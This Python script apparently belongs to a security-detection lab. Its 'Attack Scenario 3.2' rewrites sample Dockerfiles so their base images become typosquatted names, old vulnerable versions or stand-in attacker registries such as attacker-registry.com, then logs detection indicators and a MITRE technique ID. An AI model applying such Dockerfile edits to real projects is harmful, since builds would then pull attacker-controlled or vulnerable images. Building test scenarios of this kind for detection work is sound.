#!/usr/bin/env python3
"""
Attack Scenario 3.2: Compromised Docker Base Image
====================================================

Modifies Dockerfile to use:
- Typosquatted image names
- Vulnerable versions
- Untrusted registries

RESEARCH ONLY - Academic purposes.
"""

import os, sys, json, shutil
from pathlib import Path
from datetime import datetime


class CompromisedImageAttack:
    def __init__(self):
        self.repo_root = Path(__file__).parent.parent.parent.parent
        self.dockerfiles = [
            self.repo_root / "sample-apps" / "frontend" / "Dockerfile",
            self.repo_root / "sample-apps" / "backend-api" / "Dockerfile"
        ]
        self.backup_suffix = datetime.now().strftime('%Y%m%d_%H%M%S')

    def inject_compromised_image(self, dockerfile, attack_type="typosquatting"):
        if not dockerfile.exists():
            dockerfile.parent.mkdir(parents=True, exist_ok=True)
            with open(dockerfile, 'w') as f:
                f.write('FROM node:18-alpine\nCOPY . /app\nWORKDIR /app\nRUN npm install\nCMD ["npm", "start"]\n')

        backup = dockerfile.parent / f"{dockerfile.name}.backup.{self.backup_suffix}"
        shutil.copy(dockerfile, backup)

        with open(dockerfile, 'r') as f:
            content = f.read()

        if attack_type == "typosquatting":
            replacements = [
                ('FROM node:', 'FROM noode:'),  # Typo
                ('FROM python:', 'FROM pytohn:'),
                ('FROM nginx:', 'FROM ngixn:')
            ]
        elif attack_type == "vulnerable_version":
            replacements = [
                ('FROM node:18', 'FROM node:14.0.0'),  # Old vulnerable
                ('FROM python:3.11', 'FROM python:3.6'),
                ('FROM nginx:latest', 'FROM nginx:1.10.0')
            ]
        elif attack_type == "untrusted_registry":
            replacements = [
                ('FROM node:', 'FROM attacker-registry.com/node:'),
                ('FROM python:', 'FROM malicious.io/python:')
            ]
        else:
            replacements = [('FROM ', 'FROM evil-registry.com/')]

        for old, new in replacements:
            if old in content:
                content = content.replace(old, new, 1)
                print(f"[*] Replaced: {old} -> {new}")
                break

        with open(dockerfile, 'w') as f:
            f.write(f"# RESEARCH ATTACK: Compromised base image\n{content}")

        return True

    def log_indicators(self, attack_type):
        indicators = {
            "attack_type": "compromised_image",
            "scenario_id": "3.2",
            "timestamp": datetime.now().isoformat(),
            "attack_variant": attack_type,
            "indicators": {
                "dockerfile_modified": True,
                "base_image_changed": True,
                "typosquatting": attack_type == "typosquatting",
                "vulnerable_version": attack_type == "vulnerable_version",
                "untrusted_registry": attack_type == "untrusted_registry",
                "registry_change": attack_type == "untrusted_registry"
            },
            "expected_detection": {
                "difficulty": "medium",
                "primary_signals": ["base_image_change", "typosquatting_pattern" if attack_type == "typosquatting" else "cve_count_spike"],
                "detection_tools": ["Trivy", "Grype", "Dockle"]
            },
            "mitre_attack": {"technique": "T1525", "name": "Implant Container Image", "tactic": "Persistence"}
        }

        log_dir = Path(__file__).parent.parent / "logs" / "indicators"
        log_dir.mkdir(parents=True, exist_ok=True)
        with open(log_dir / f"compromised_image_{self.backup_suffix}.json", 'w') as f:
            json.dump(indicators, f, indent=2)

        return indicators

    def execute(self, attack_type="typosquatting"):
        print("=" * 80)
        print("ATTACK SCENARIO 3.2: Compromised Container Image")
        print(f"Attack Type: {attack_type}\n")

        for dockerfile in self.dockerfiles:
            if dockerfile.exists():
                self.inject_compromised_image(dockerfile, attack_type)

        indicators = self.log_indicators(attack_type)
        print(f"\n[OK] Status: SUCCESS")
        print(f"Detection Difficulty: {indicators['expected_detection']['difficulty']}")
        print("=" * 80)
        return True


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('--type', choices=['typosquatting', 'vulnerable_version', 'untrusted_registry'],
                       default='typosquatting')
    args = parser.parse_args()
    sys.exit(0 if CompromisedImageAttack().execute(args.type) else 1)
